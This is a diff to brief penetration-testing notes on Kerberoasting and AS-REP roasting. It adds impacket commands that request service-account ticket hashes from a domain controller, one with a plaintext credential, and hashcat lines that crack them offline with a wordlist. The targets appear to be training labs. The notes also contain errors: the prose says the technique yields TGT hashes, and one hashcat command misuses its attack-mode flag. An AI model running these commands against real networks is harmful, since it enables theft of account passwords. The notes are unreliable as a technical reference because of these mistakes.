@@ -1,8 +1,13 @@
 Kerberos is a network authentication protocol that allows entities to prove their identity over a non-secure network in a secure way. Kerberoasting is a technique used in penetration testing and security assessments to exploit vulnerabilities in the Kerberos authentication system. The goal is to obtain Kerberos Ticket Granting Ticket (TGT) hashes for service accounts and crack them offline to obtain plaintext passwords.
 
+python GetUserSPNs.py -request -dc-ip 10.0.3.4 MARVEL.local/administrator 
+python GetUserSPNs.py MARVEL.local/fadministrator:Password1 -dc-ip 10.0.3.4 -request
+
 impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/SVC_TGS -no-pass
 impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/SVC_TGS:<password>
 
+
+hashcat -m 13100 hash.txt rockyou -O
 hashcat -m 13100 hash.txt -a /usr/share/wordlist/rockyou.txt 
 hashcat -m 18200 hash.txt /usr/share/wordlist/rockyou.txt
 
